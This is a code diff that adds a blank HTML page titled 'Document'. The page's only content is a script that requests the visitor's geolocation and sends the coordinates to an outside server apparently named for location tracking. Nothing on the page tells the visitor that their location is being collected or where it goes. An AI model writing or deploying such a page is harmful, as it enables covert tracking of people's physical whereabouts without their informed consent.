@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+</body>
+<script>
+if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(
+        (possible)=>{
+            let latitude= possible.coords.latitude
+            let longiTude= possible.coords.longitude
+            let obj ={
+                latitude,
+                longiTude,
+            }
+           
+
+            fetch('https://locationtrack-xpoh.onrender.com/location',{
+                method:"POST",
+                headers:{
+                    'content-type':"application/json",
+                },
+                body:JSON.stringify(obj)
+            })
+            .then(res =>res.json())
+            .then(res => console.log(res))
+            
+
+            
+        },
+        (error)=>{
+            console.log("access Denaid")
+        },
+    )
+}
+
+
+
+    
+
+
+</script>
+</html>
